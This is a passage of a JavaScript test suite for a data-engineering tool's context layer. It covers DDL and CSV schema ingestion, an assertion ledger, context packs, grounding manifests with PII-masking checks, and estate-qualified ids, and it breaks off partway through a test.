    const { ContextValidator } = require('../dist/engine/context/ContextValidator.js');
    const schema = JSON.parse(nodeFs.readFileSync(require('node:path').join(__dirname, '..', 'docs', 'schemas', 'context-envelope.schema.json'), 'utf8'));
    const v = new ContextValidator(schema);
    const env = { id: 'term:revenue', kind: 'business_term', layer: 'definition', label: 'Revenue', origin: { source: 'user', sourceRef: 'x' }, version: 1 };
    assert.deepStrictEqual(v.validateEnvelope({ ...env, content: { formula: 'SUM(x)' } }), { valid: true, errors: [], warnings: [] });
    const bad = v.validateEnvelope({ ...env, content: { formula: 42 } });
    assert.strictEqual(bad.valid, true, 'old persisted data keeps loading');
    assert.ok(bad.warnings.some((w) => w.startsWith('/content/formula')), JSON.stringify(bad.warnings));
    const rule = v.validateEnvelope({ ...env, id: 'rule:pii', kind: 'business_rule', content: { enforcementLevel: 'MAYBE' } });
    assert.ok(rule.warnings.some((w) => w.includes('/content/enforcementLevel')));
    assert.strictEqual(v.validateEnvelope({ ...env, kind: 'edge' }).warnings.length, 0, 'kinds without a content definition are not checked');
  });

  await test('v0.29.0: parseDdl() keeps the declared schema (shop.customers ≠ crm.customers) and honours table-level PRIMARY KEY', () => {
    const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const r = parseDdl(`
      CREATE TABLE shop.customers (customer_id INT PRIMARY KEY, email VARCHAR(255));
      CREATE TABLE crm.customers (cust_no VARCHAR(20) PRIMARY KEY, email VARCHAR(255));
      CREATE TABLE analytics.sales.order_lines (order_id INT, line_no INT, CONSTRAINT pk_ol PRIMARY KEY (order_id, line_no));
      CREATE TABLE loose (id INT);
    `, '/data/all.sql');
    const tables = r.nodes.filter((n) => n.type === 'table');
    assert.deepStrictEqual(tables.map((t) => t.fqn), ['shop.customers', 'crm.customers', 'analytics.sales.order_lines', 'ddl.loose']);
    assert.strictEqual(new Set(tables.map((t) => t.id)).size, 4);
    assert.deepStrictEqual([tables[2].database, tables[2].schema], ['analytics', 'sales']);
    assert.strictEqual(r.nodes.filter((n) => n.type === 'column' && n.id.startsWith('obj:all/default/crm.customers.')).length, 2, 'columns are not merged across the two customers tables');
    const lines = r.nodes.filter((n) => n.type === 'column' && n.id.startsWith('obj:all/default/analytics.sales.order_lines.'));
    assert.deepStrictEqual(lines.map((c) => [c.label, c.isPrimaryKey, c.isNullable]), [['order_id', true, false], ['line_no', true, false]]);
  });

  await test('v0.29.0: ContextFileManager records every load in the ledger, projects supportedBy/confidence, and a business-context edit supersedes (it used to be ignored once derived/graph.json existed)', async () => {
    const nodeFs = require('node:fs');
    const p = require('node:path');
    const dir = c2.tmp();
    const authDir = p.join(dir, '.autode', 'knowledge');
    nodeFs.mkdirSync(authDir, { recursive: true });
    const write = (formula) => nodeFs.writeFileSync(p.join(authDir, 'business-context.yaml'), ['business_terms:', '  - term: Revenue', `    formula: ${formula}`, '  - term: Margin', '    formula: revenue - cost', ''].join('\n'));
    write('SUM(amount)');
    const mock = {
      Uri: { file: (x) => ({ fsPath: x }), joinPath: (...parts) => ({ fsPath: parts.map((x) => (x && x.fsPath) ? x.fsPath : String(x)).join('/') }) },
      workspace: { fs: { createDirectory: async () => {} }, createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} }) },
      RelativePattern: class {}
    };
    delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
    delete require.cache[require.resolve('../dist/context/GraphManager.js')];
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    try {
      const graph = new GraphManager();
      const cfm = new ContextFileManager({ fsPath: dir }, graph, () => {});
      await cfm.initialize();
      const term = () => graph.getNodesByType('business_term').find((n) => n.label === 'Revenue');
      assert.strictEqual(term().id, 'term:revenue', 'term ids are keyed by name, not position (namespaced since v0.31.0)');
      assert.strictEqual(term().origin.confidence, 0.8);
      assert.strictEqual(term().supportedBy.length, 1);
      const firstId = term().supportedBy[0];
      assert.ok(nodeFs.readdirSync(p.join(dir, '.autode', 'knowledge', 'ledger')).some((f) => f.endsWith('.jsonl')));

      write('SUM(amount) - SUM(refunds)');
      const graph2 = new GraphManager();
      const cfm2 = new ContextFileManager({ fsPath: dir }, graph2, () => {});
      await cfm2.initialize();
      const t2 = graph2.getNodesByType('business_term').find((n) => n.label === 'Revenue');
      assert.strictEqual(t2.formula, 'SUM(amount) - SUM(refunds)', 'the edit reaches the graph');
      assert.strictEqual(cfm2.getLedger().get(firstId).status, 'superseded');
      assert.strictEqual(cfm2.getLedger().get(t2.supportedBy[0]).supersedes, firstId);
      assert.strictEqual(graph2.getNodesByType('business_term').length, 2);

      // File ingestion goes through persistCompiledGraph() — and is recorded too.
      await graph2.addNode({ id: 'table-shop_orders', type: 'table', label: 'orders', fqn: 'shop.orders', database: 'x', schema: 'shop', isView: false, metadata: {}, version: 1, origin: { source: 'derived', sourceRef: '/d/shop.ddl', reliability: 'best-effort-inferred' } });
      await cfm2.persistCompiledGraph();
      const table = graph2.getNodesByType('table')[0];
      assert.strictEqual(cfm2.getLedger().get(table.supportedBy[0]).kind, 'schema_fact');
      assert.strictEqual(cfm2.getLedger().get(table.supportedBy[0]).evidence[0].ref, '/d/shop.ddl');
      assert.deepStrictEqual(cfm2.getConflicts(), []);
    } finally {
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: a live extraction (schema-graph.json) is recorded as verified schema facts and no longer wipes file-ingested tables', async () => {
    const nodeFs = require('node:fs');
    const p = require('node:path');
    const dir = c2.tmp();
    const ctxDir = p.join(dir, '.autode');
    nodeFs.mkdirSync(p.join(ctxDir, 'local'), { recursive: true });
    const mock = {
      Uri: { file: (x) => ({ fsPath: x }), joinPath: (...parts) => ({ fsPath: parts.map((x) => (x && x.fsPath) ? x.fsPath : String(x)).join('/') }) },
      workspace: { fs: { createDirectory: async () => {} }, createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} }) },
      RelativePattern: class {}
    };
    delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
    delete require.cache[require.resolve('../dist/context/GraphManager.js')];
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    try {
      const graph = new GraphManager();
      const cfm = new ContextFileManager({ fsPath: dir }, graph, () => {});
      await cfm.initialize();
      await graph.addNode({ id: 'table-csv_events', type: 'table', label: 'events', fqn: 'csv.events', database: 'ingested_files', schema: 'csv', isView: false, metadata: {}, version: 1, origin: { source: 'derived', sourceRef: '/d/events.csv' } });
      await cfm.persistCompiledGraph();
      const schemaGraphPath = p.join(ctxDir, 'local', 'schema-graph.json');
      const live = { source: 'system', sourceRef: 'snowflake', connectionId: 'sf', reliability: 'live-verified', lastVerifiedAt: '2026-10-14T00:00:00.000Z' };
      nodeFs.writeFileSync(schemaGraphPath, JSON.stringify({ nodes: [{ id: 't1', type: 'table', label: 'orders', fqn: 'DB.PUBLIC.orders', metadata: {}, version: 1, origin: live }], edges: [] }));
      const future = new Date(Date.now() + 60000);
      nodeFs.utimesSync(schemaGraphPath, future, future);
      const graph2 = new GraphManager();
      const cfm2 = new ContextFileManager({ fsPath: dir }, graph2, () => {});
      await cfm2.initialize();
      assert.deepStrictEqual(graph2.getNodesByType('table').map((t) => t.id).sort(), ['obj:events/default/csv.events', 'obj:sf/default/db.public.orders'], 'legacy ids are re-keyed to the estate scheme (v0.31.0)');
      const a = cfm2.getLedger().get(graph2.getNodeById('t1').supportedBy[0]);
      assert.deepStrictEqual([a.kind, a.trust, a.status, a.specId, a.evidence[0].type], ['schema_fact', 'verified', 'active', undefined, 'introspection'], 'project-wide schema_fact when no problem is active');
    } finally {
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  // ---------- v0.30.0: context-layer C3 — context packs, manifests, causality ----------

  // Phase K1: file-ingested ids are estate-qualified — system 'all' (from /ref/all.ddl), environment 'default'.
  const T = (fqn, col) => `obj:all/default/${fqn}${col ? '.' + col : ''}`;
  const c3 = {
    /** shop (orders, order_items, refunds, customers), crm (customers, support_tickets), hr (employees) — via the real DDL parser. */
    graph() {
      const { parseDdl } = require('../dist/engine/context/fileIngestion.js');
      const parsed = parseDdl(`
        CREATE TABLE shop.orders (order_id BIGINT PRIMARY KEY, customer_id INT NOT NULL, status VARCHAR(20), updated_at TIMESTAMP);
        CREATE TABLE shop.order_items (order_item_id BIGINT PRIMARY KEY, order_id BIGINT, quantity INT, unit_price DECIMAL(10,2));
        CREATE TABLE shop.refunds (refund_id BIGINT PRIMARY KEY, order_id BIGINT, amount DECIMAL(10,2));
        CREATE TABLE shop.customers (customer_id INT PRIMARY KEY, email VARCHAR(255), phone VARCHAR(32));
        CREATE TABLE crm.customers (cust_no VARCHAR(20) PRIMARY KEY, email VARCHAR(255), shop_customer_id INT);
        CREATE TABLE crm.support_tickets (ticket_id BIGINT PRIMARY KEY, cust_no VARCHAR(20));
        CREATE TABLE hr_legacy.employees (employee_id INT PRIMARY KEY, salary DECIMAL(10,2));
      `, '/ref/all.ddl');
      const nodes = [...parsed.nodes,
        { id: 'biz-term-revenue', type: 'business_term', label: 'Revenue', description: 'Gross', formula: 'SUM(order_items.quantity * order_items.unit_price)', mappedNodeIds: [], metadata: {}, version: 1, origin: { source: 'user', sourceRef: 'context/business-context.yaml', extractor: 'business-context' } },
        { id: 'biz-rule-1', type: 'business_rule', label: 'PII masking', ruleText: 'Customer email and phone are PII and must be masked (SHA-256) in every analytics layer.', enforcementLevel: 'STRICT', metadata: {}, version: 1, origin: { source: 'user', sourceRef: 'context/business-context.yaml', extractor: 'business-context' } },
        { id: 'biz-rule-2', type: 'business_rule', label: 'Daily load', ruleText: 'Loads finish by 06:00.', enforcementLevel: 'STRICT', metadata: {}, version: 1, origin: { source: 'user', sourceRef: 'x', extractor: 'business-context' } }
      ];
      const edges = [...parsed.edges, { id: 'edge-maps-revenue-items', source: 'biz-term-revenue', target: T('shop.order_items'), type: 'maps_to', weight: 0.8 }];
      return { nodes, edges };
    },
    async ledgerFor(graph) {
      const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
      const root = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-c3-'));
      const { AssertionLedger } = require('../dist/engine/context/ledger.js');
      const { syncGraphToLedger, projectGraph } = require('../dist/engine/context/projection.js');
      const ledger = new AssertionLedger(p.join(root, 'ledger'));
      await syncGraphToLedger(ledger, graph);
      const project = () => projectGraph(ledger.assertions());
      return { root, ledger, project, cleanup: () => nodeFs.rmSync(root, { recursive: true, force: true }) };
    },
    sources(ledger, graph, conflicts = []) {
      return { graph, assertions: ledger.assertions(), conflicts };
    }
  };

  await test('v0.30.0: resolveText() finds qualified names, schema mentions, prose labels (singular/plural, multi-word) and terms — and nothing in unrelated text', () => {
    const { resolveText } = require('../dist/engine/context/retrieval.js');
    const g = c3.graph();
    const ids = (t) => [...new Set(resolveText(t, g).map((m) => m.nodeId))].sort();
    assert.deepStrictEqual(ids('Map shop.orders and crm.customers.email'), [T('crm.customers', 'email'), T('crm.customers'), T('shop.orders')].sort());
    assert.deepStrictEqual(ids('Assess the shop and crm source schemas'), [T('crm.customers'), T('crm.support_tickets'), T('shop.customers'), T('shop.order_items'), T('shop.orders'), T('shop.refunds')].sort());
    assert.deepStrictEqual(ids('number of support tickets per order'), [T('crm.support_tickets'), T('shop.orders')].sort());
    assert.deepStrictEqual(ids('one row per order item, net of refunds'), [T('shop.order_items'), T('shop.refunds')].sort());
    assert.deepStrictEqual(ids('dedupe customers'), [T('crm.customers'), T('shop.customers')], 'an ambiguous label matches every candidate');
    assert.deepStrictEqual(ids('what does revenue mean?'), ['biz-term-revenue'].sort());
    assert.deepStrictEqual(ids('build it with dbt on snowflake'), [].sort());
  });

  await test('v0.30.0: expandNeighborhood() walks edges both ways with distance decay (GraphManager.traverseNeighborhood delegates to it)', async () => {
    const { expandNeighborhood } = require('../dist/engine/context/retrieval.js');
    const g = c3.graph();
    const r = expandNeighborhood(g, [T('shop.order_items')], { maxHops: 1, decay: 0.5 });
    assert.strictEqual(r.get(T('shop.order_items')).relevance, 1);
    assert.strictEqual(r.get('biz-term-revenue').relevance, 0.5, 'reached against the edge direction (term → table)');
    assert.ok(r.has(T('shop.order_items', 'quantity')));
    assert.ok(!r.has(T('shop.orders')));
    const { GraphManager } = withMock(createMock(), () => fresh('../dist/context/GraphManager.js'));
    const gm = new GraphManager();
    await gm.loadSnapshot(g);
    const sub = gm.traverseNeighborhood([T('shop.order_items')], { maxHops: 1 });
    assert.ok(sub.nodes.some((n) => n.id === 'biz-term-revenue' && n.metadata.__relevance > 0));
  });

  await test('v0.30.0: with no seeds a pack is the project overview — byte-for-byte the pre-C3 buildContextPrompt() format', async () => {
    const { buildContextPack } = require('../dist/engine/context/contextPack.js');
    const g = c3.graph();
    const pack = buildContextPack({ purpose: 'chat' }, { graph: g, assertions: [], conflicts: [], runtimeFacts: [{ label: 'Source', text: 'connected' }] });
    const tables = g.nodes.filter((n) => n.type === 'table');
    const expected = [
      '## Live Session Facts', '- **Source**: connected',
      '## Enterprise Context Layer',
      '### Business Rules (STRICT)', '- **PII masking**: Customer email and phone are PII and must be masked (SHA-256) in every analytics layer.', '- **Daily load**: Loads finish by 06:00.',
      '### Database Tables', ...tables.map((t) => `- \`${t.fqn}\` _(file-derived, not live-verified)_`),
      '### Business Terms', '- **Revenue** (formula: SUM(order_items.quantity * order_items.unit_price)): Gross'
    ].join('\n');
    assert.strictEqual(pack.text, expected);
    assert.strictEqual(pack.manifest.mode, 'overview');
    assert.strictEqual(buildContextPack({ purpose: 'chat', query: 'build it with dbt' }, { graph: g, assertions: [], conflicts: [] }).manifest.mode, 'overview', 'nothing resolved = overview');
  });

  await test('v0.30.0: a seeded step pack is task-scoped — seed columns, STRICT rules and conflicts in scope, no unrelated tables — and deterministic', async () => {
    const { buildContextPack } = require('../dist/engine/context/contextPack.js');
    const { detectConflicts } = require('../dist/engine/context/conflicts.js');
    const env = await c3.ledgerFor(c3.graph());
    try {
      await env.ledger.assert({ kind: 'metric', subject: ['metric:net'], predicate: 'defined_as', value: { name: 'Revenue', expression: 'SUM(x - y)' }, statement: 'Revenue is net', evidence: [{ type: 'chat_message', ref: 't2' }] });
      const graph = env.project();
      const sources = c3.sources(env.ledger, graph, detectConflicts(env.ledger.assertions()));
      const req = { purpose: 'step', query: 'Map shop.order_items and shop.customers to the target, masking email.', stepId: 's3' };
      const a = buildContextPack(req, sources);
      const b = buildContextPack(req, sources);
      assert.strictEqual(a.text, b.text);
      assert.strictEqual(a.manifest.packId, b.manifest.packId);
      assert.strictEqual(a.manifest.mode, 'seeded');
      assert.ok(a.text.includes('`shop.order_items`') && a.text.includes('order_item_id BIGINT PK'), a.text);
      assert.ok(a.text.includes('`shop.customers`') && a.text.includes('email VARCHAR(255)'));
      assert.ok(!/employees|hr_legacy|support_tickets/.test(a.text), 'unrelated tables are not delivered');
      assert.ok(a.text.includes('PII masking'), 'the STRICT rule naming a seed table\'s columns... is included');
      assert.ok(/Conflict \(definition\)/.test(a.text), 'a conflict on a term in scope is a warning in the pack');
      assert.ok(a.manifest.assertions.length > 5 && a.manifest.assertions.every((x) => /^sha256:/.test(x.revision)));
      assert.ok(a.manifest.nodeIds.includes(T('shop.order_items')));
      const tiny = buildContextPack({ ...req, maxTokens: 60 }, sources);
      assert.ok(tiny.manifest.truncated.tables >= 1 || tiny.manifest.truncated.columns >= 1, JSON.stringify(tiny.manifest.truncated));
      assert.ok(/Not shown \(token budget\)/.test(tiny.text));
    } finally { env.cleanup(); }
  });

  await test('v0.30.0: context gaps — "tickets per order" with no join is a gap; a proposed join is below trust; a confirmed one closes it; "one row per order line" is not a request to join', async () => {
    const { buildContextPack } = require('../dist/engine/context/contextPack.js');
    const env = await c3.ledgerFor(c3.graph());
    try {
      const ask = (q) => buildContextPack({ purpose: 'chat', query: q }, c3.sources(env.ledger, env.project())).manifest.gaps;
      let gaps = ask('Also show the number of support tickets per order on the dashboard.');
      assert.strictEqual(gaps.length, 1);
      assert.deepStrictEqual([gaps[0].needed, gaps[0].reason, gaps[0].minTrust], ['relationship', 'absent', 'confirmed']);
      assert.deepStrictEqual(gaps[0].subject.sort(), [T('crm.support_tickets'), T('shop.orders')]);
      assert.strictEqual(ask('Join shop.refunds to shop.orders').length, 1);
      assert.strictEqual(ask('fct_order_lines has one row per order line').length, 0);
      const rel = await env.ledger.assert({ kind: 'relationship', subject: [T('shop.refunds'), T('shop.orders')], predicate: 'joins_to', value: { from: { entity: 'shop.refunds', columns: ['order_id'] }, to: { entity: 'shop.orders', columns: ['order_id'] }, cardinality: 'N:1' }, statement: 'refunds join orders', evidence: [{ type: 'chat_message', ref: 't' }] });
      gaps = ask('Join shop.refunds to shop.orders');
      assert.deepStrictEqual([gaps[0].reason, gaps[0].foundTrust], ['below_trust', 'inferred']);
      await env.ledger.confirm(rel.id, 'user:arun');
      assert.strictEqual(ask('Join shop.refunds to shop.orders').length, 0, 'a confirmed relationship (projected as an edge) closes the gap');
      assert.strictEqual(ask('show refunds per order').length, 0);
    } finally { env.cleanup(); }
  });

  await test('v0.30.0: decision backing maps primitive parameters to assertions — declared PK (documented, below trust), confirmed key, decision, or unbacked', async () => {
    const { backDecisions } = require('../dist/engine/grounding/manifest.js');
    const env = await c3.ledgerFor(c3.graph());
    try {
      const use = { kind: 'dedup', source: 'primitive', params: { sourceObject: 'RAW.SHOP.ORDERS', targetObject: 'stg_orders', partitionByColumns: ['order_id'], orderByColumn: 'updated_at' } };
      let d = backDecisions(use, env.project(), env.ledger.assertions());
      const part = d.find((x) => x.usedFor === 'dedup.partitionByColumns');
      assert.strictEqual(part.subject, T('shop.orders'), 'RAW.SHOP.ORDERS resolves to shop.orders');
      assert.deepStrictEqual([part.backedBy.trust, part.belowTrust], ['documented', true], 'the DDL\'s declared PK backs it, below the confirmed keys need');
      assert.strictEqual(d.find((x) => x.usedFor === 'dedup.orderByColumn').unbacked, true);
      const key = await env.ledger.assert({ kind: 'key', subject: [T('shop.orders')], predicate: 'primary', value: ['ORDER_ID'], statement: 'order_id is the key', evidence: [{ type: 'chat_message', ref: 't3' }], status: 'active', trust: 'confirmed' });
      const inc = await env.ledger.assert({ kind: 'decision', subject: [T('shop.orders')], predicate: 'load_strategy', value: { strategy: 'incremental', column: 'updated_at' }, statement: 'load incrementally on updated_at', evidence: [{ type: 'chat_message', ref: 't9' }], status: 'active', trust: 'confirmed' });
      d = backDecisions(use, env.project(), env.ledger.assertions());
      assert.deepStrictEqual(d.map((x) => [x.usedFor, x.backedBy && x.backedBy.id, !!x.belowTrust, !!x.unbacked]), [
        ['dedup.partitionByColumns', key.id, false, false],
        ['dedup.orderByColumn', inc.id, false, false]
      ]);
      assert.deepStrictEqual(backDecisions({ ...use, source: 'primitive', params: { ...use.params, sourceObject: 'nowhere' } }, env.project(), env.ledger.assertions()).map((x) => !!x.unbacked), [true, true]);
    } finally { env.cleanup(); }
  });

  await test('v0.30.0: STRICT masking rules are machine-checked against artifact SQL; other STRICT rules are listed for manual review', () => {
    const { checkRules } = require('../dist/engine/grounding/manifest.js');
    const rules = c3.graph().nodes.filter((n) => n.type === 'business_rule');
    const cols = new Set(['email', 'phone', 'customer_id']);
    const status = (sql) => checkRules(sql, rules, cols).map((r) => r.status);
    assert.deepStrictEqual(status('select customer_id, sha2(email, 256) as email, sha2(phone, 256) as phone from c'), ['pass', 'manual_review']);
    const bad = checkRules('select customer_id, email, sha2(phone) as phone from c', rules, cols)[0];
    assert.deepStrictEqual([bad.status, bad.detail], ['violation', 'unmasked: email']);
    assert.deepStrictEqual(status('select order_id from o -- email is not here'), ['not_applicable', 'manual_review'], 'comments are ignored');
  });

  await test('v0.30.0: a grounding manifest records spec, step, pack, decisions and checks; a superseded backing fact makes it stale; Explain shows the chain', async () => {
    const { buildGroundingManifest, manifestStaleReasons, explainManifest, renderGroundingReport } = require('../dist/engine/grounding/manifest.js');
    const { buildContextPack } = require('../dist/engine/context/contextPack.js');
    const { buildSchemaIndex } = require('../dist/engine/grounding/sqlGrounding.js');
    const env = await c3.ledgerFor(c3.graph());
    try {
      const key = await env.ledger.assert({ kind: 'key', subject: [T('shop.orders')], predicate: 'primary', value: ['order_id'], statement: 'order_id is the key of shop.orders', evidence: [{ type: 'chat_message', ref: 'chat#t3', excerpt: 'An order is uniquely identified by order_id' }], status: 'active', trust: 'confirmed' });
      const graph = env.project();
      const pack = buildContextPack({ purpose: 'step', query: 'stg_orders: dedup shop.orders', stepId: 's5' }, c3.sources(env.ledger, graph));
      const sql = 'CREATE OR REPLACE VIEW stg_orders AS SELECT o.order_id, o.status, c.email FROM shop.orders o JOIN shop.customers c ON o.customer_id = c.customer_id JOIN shop.nonexistent n ON n.id = o.order_id';
      const m = buildGroundingManifest({
        artifact: { path: '03-build/retail.v1/stg_orders.sql', content: sql, language: 'sql', agent: 'transformScaffoldAgent', specId: 'retail', specVersion: 1 },
        specRevision: 'sha256:abc', stepId: 's5', pack: pack.manifest,
        primitiveUses: [{ kind: 'dedup', version: 2, source: 'primitive', params: { sourceObject: 'shop.orders', targetObject: 'stg_orders', partitionByColumns: ['order_id'], orderByColumn: 'updated_at' } }],
        graph, schemaIndex: buildSchemaIndex(graph.nodes, graph.edges), assertions: env.ledger.assertions(), model: 'openai/gpt', now: () => new Date('2026-10-14T00:00:00Z')
      });
      assert.deepStrictEqual([m.planStepId, m.packId, m.specRevision, m.generation, m.primitives[0].kind, m.model], ['s5', pack.manifest.packId, 'sha256:abc', 'primitive', 'dedup', 'openai/gpt']);
      assert.ok(m.assertions.some((a) => a.id === key.id && a.usedFor === 'dedup.partitionByColumns'));
      assert.ok(m.assertions.some((a) => a.usedFor === 'context'));
      assert.strictEqual(m.grounding.decisions.unbacked, 1, 'orderByColumn has no backing');
      assert.ok(m.gaps.some((g) => g.needed === 'decision' && /orderByColumn/.test(g.text)));
      assert.ok(m.grounding.warnings.some((w) => w.startsWith('GROUNDING_UNRESOLVED') && w.includes('shop.nonexistent')));
      assert.ok(m.grounding.warnings.some((w) => w.startsWith('RULE_VIOLATION') && w.includes('email')));
      assert.deepStrictEqual(manifestStaleReasons(m, (id) => env.ledger.get(id)), []);

      await env.ledger.supersede(key.id, { kind: 'key', subject: [T('shop.orders')], predicate: 'primary', value: ['order_id', 'line_no'], statement: 'the key is (order_id, line_no)', evidence: [{ type: 'chat_message', ref: 'chat#t12' }], status: 'active', trust: 'confirmed' });
      const reasons = manifestStaleReasons(m, (id) => env.ledger.get(id));
      assert.strictEqual(reasons.length, 1);
      assert.ok(/^dedup\.partitionByColumns changed: "order_id is the key of shop\.orders" was superseded by \S+ \(chat message chat#t3\)$/.test(reasons[0]), reasons[0]);
      const why = explainManifest(m, (id) => env.ledger.get(id));
      assert.ok(why.includes('**Stale:**') && why.includes('← "order_id is the key of shop.orders" (confirmed, superseded)') && why.includes('"An order is uniquely identified by order_id"'), why);
      assert.ok(why.includes('**dedup.orderByColumn** = `"updated_at"` — **unbacked**'));
      const report = renderGroundingReport([m]);
      assert.ok(report.includes('| Unbacked decisions | 1 |') && report.includes('| STRICT rule violations | 1 |') && report.includes('Loads finish by 06:00.'), report);
    } finally { env.cleanup(); }
  });

  await test('v0.30.0: parseDdl() ignores SQL comments (a trailing "-- A, B, C" used to swallow the next column)', () => {
    const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const r = parseDdl('CREATE TABLE shop.orders (\n  status VARCHAR(20) NOT NULL, -- PLACED, SHIPPED, RETURNED\n  channel VARCHAR(20), /* web, app */\n  updated_at TIMESTAMP\n);', '/x.sql');
    assert.deepStrictEqual(r.nodes.filter((n) => n.type === 'column').map((c) => `${c.label} ${c.dataType}`), ['status VARCHAR(20)', 'channel VARCHAR(20)', 'updated_at TIMESTAMP']);
  });

  // ---------- v0.31.0: Phase K1 — estate identity and catalogs ----------

  await test('v0.31.0: ids are estate-qualified and namespaced; estate.yaml round-trips; unbound sources get a system named after them', () => {
    const e = require('../dist/engine/context/estate.js');
    assert.strictEqual(e.objectId('shop', 'prod', 'SALES.PUBLIC.Orders'), 'obj:shop/prod/sales.public.orders');
    assert.strictEqual(e.objectId('shop', 'prod', 'SALES.PUBLIC.Orders', 'Order_ID'), 'obj:shop/prod/sales.public.orders.order_id');
    assert.strictEqual(e.edgeId('contains', 'a', 'b'), 'edge:contains:a->b');
    assert.deepStrictEqual([e.termId('Net Revenue'), e.queryId('Monthly Revenue'), e.ruleId('Customer email and phone are PII and must be masked')], ['term:net-revenue', 'query:monthly-revenue', 'rule:customer-email-and-phone-are-pii']);
    assert.deepStrictEqual(e.parseObjectId('obj:crm/dev/crm.customers.email'), { system: 'crm', environment: 'dev', path: 'crm.customers.email' });
    assert.ok(e.isCanonicalId('term:x') && !e.isCanonicalId('table-shop_orders'));

    const estate = e.parseEstate('systems:\n  - id: Shop OMS\n    name: Shop OMS\n    role: source\n  - id: edw\n    role: target\n    schemaRoles: { "EDW.RAW": source }\nbindings:\n  - connection: "snowflake:acme"\n    system: shop-oms\n    environment: PROD\n    schemas: [SALES.PUBLIC, SALES.ORDERS]\n  - file: crm.ddl\n    system: crm\n');
    assert.deepStrictEqual(estate.systems.map((s) => s.id), ['shop-oms', 'edw']);
    assert.deepStrictEqual(e.parseEstate(e.serializeEstate(estate)), estate, 'round-trips');
    const bound = e.resolveIdentity(estate, { connection: 'snowflake:acme' });
    assert.deepStrictEqual([bound.identity, bound.created], [{ system: 'shop-oms', environment: 'prod', role: 'source' }, false]);
    assert.strictEqual(e.resolveIdentity(estate, { file: 'C:\\data\\CRM.ddl' }).identity.system, 'crm', 'files match by name, case-insensitively');
    const fresh = e.resolveIdentity(estate, { connection: 'databricks:adb-1.azure.net' });
    assert.strictEqual(fresh.created, true);
    assert.strictEqual(fresh.identity.system, 'databricks-adb-1-azure-net');
    assert.ok(fresh.estate.systems.some((s) => s.id === 'databricks-adb-1-azure-net') && fresh.estate.bindings.some((b) => b.connection === 'databricks:adb-1.azure.net'));
    assert.deepStrictEqual([e.roleFor(estate, 'edw', 'EDW', 'RAW'), e.roleFor(estate, 'edw', 'EDW', 'MARTS')], ['source', 'target'], 'a schema can override its system\'s role (in-place modernisation)');
  });

  await test('v0.31.0: identically named tables in two systems — or in dev and prod of one — stay distinct, with system and environment on their origin', () => {
    const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const ddl = 'CREATE TABLE ref.currency_codes (code CHAR(3) PRIMARY KEY, name VARCHAR(50));';
    const shop = parseDdl(ddl, '/src/shop.ddl', { system: 'shop', environment: 'prod' });
    const crm = parseDdl(ddl, '/src/crm.ddl', { system: 'crm', environment: 'prod' });
    const shopDev = parseDdl(ddl, '/src/shop_dev.ddl', { system: 'shop', environment: 'dev' });
    const ids = [shop, crm, shopDev].flatMap((r) => r.nodes.map((n) => n.id));
    assert.strictEqual(new Set(ids).size, ids.length, 'no collisions');
    const t = shopDev.nodes.find((n) => n.type === 'table');
    assert.deepStrictEqual([t.id, t.origin.system, t.origin.systemEnvironment, t.origin.environment], ['obj:shop/dev/ref.currency_codes', 'shop', 'dev', 'source']);
    assert.strictEqual(parseDdl(ddl, '/src/target.ddl', { system: 'edw', role: 'target' }).nodes[0].origin.environment, 'target');
    assert.strictEqual(parseDdl(ddl, '/x/legacy_export.sql').nodes[0].id, 'obj:legacy-export/default/ref.currency_codes', 'default system: the file name');
  });

  await test('v0.31.0: legacy column-dictionary CSVs (Teradata DBC.ColumnsV, Oracle ALL_TAB_COLUMNS, INFORMATION_SCHEMA.COLUMNS) become tables and typed columns', () => {
    const { parseCsv } = fresh('../dist/engine/context/fileIngestion.js');
    const td = parseCsv('DatabaseName,TableName,ColumnName,ColumnType,ColumnLength,DecimalTotalDigits,DecimalFractionalDigits,Nullable,ColumnId\nEDW,CUSTOMER,CUST_NO,CV,20,,,N,1\nEDW,CUSTOMER,BAL_AMT,D,,18,2,Y,2\nEDW,TXN,TXN_TS,TS,,,,N,1\n', '/x/dbc.csv', { system: 'edw' });
    assert.strictEqual(td.tableCount, 2);
    const cols = Object.fromEntries(td.nodes.filter((n) => n.type === 'column').map((c) => [c.label, `${c.dataType}${c.isNullable ? '' : ' NOT NULL'}`]));
    assert.deepStrictEqual(cols, { CUST_NO: 'VARCHAR(20) NOT NULL', BAL_AMT: 'DECIMAL(18,2)', TXN_TS: 'TIMESTAMP NOT NULL' });
    assert.ok(td.nodes.some((n) => n.id === 'obj:edw/default/edw.customer'));
    assert.ok(td.warnings.some((w) => /Teradata/.test(w)));
    const ora = parseCsv('OWNER,TABLE_NAME,COLUMN_NAME,DATA_TYPE,DATA_LENGTH,DATA_PRECISION,DATA_SCALE,NULLABLE,COLUMN_ID\nSALES,ORDERS,ORDER_ID,NUMBER,22,10,0,N,1\nSALES,ORDERS,NOTE,VARCHAR2,200,,,Y,2\n', '/x/oracle.csv');
    assert.deepStrictEqual(ora.nodes.filter((n) => n.type === 'column').map((c) => c.dataType), ['NUMBER(10,0)', 'VARCHAR2(200)']);
    const mssql = parseCsv('TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH\nERP,dbo,Invoice,Id,1,NO,int,\nERP,dbo,Invoice,Memo,2,YES,nvarchar,-1\n', '/x/is.csv', { system: 'erp' });
    assert.ok(mssql.nodes.some((n) => n.id === 'obj:erp/default/erp.dbo.invoice'));
